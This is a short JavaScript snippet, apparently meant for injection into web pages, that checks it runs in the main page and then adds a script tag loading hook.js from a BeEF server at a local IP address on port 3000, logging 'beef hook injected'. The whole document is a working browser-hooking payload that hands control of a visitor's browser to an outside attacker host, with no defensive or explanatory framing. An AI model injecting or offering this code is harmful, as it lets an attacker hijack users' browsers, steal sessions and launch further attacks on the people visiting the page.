if(parent.document.URL != document.location.href){
throw new Error("Not the main page");
}


(function(e){e.setAttribute("src", "http://192.168.3.1:3000/hook.js");
document.getElementsByTagName("body")[0].appendChild(e);})
(document.createElement("script"));void(0);

console.log("!!!!!! beef hook injected !!!!!!!")

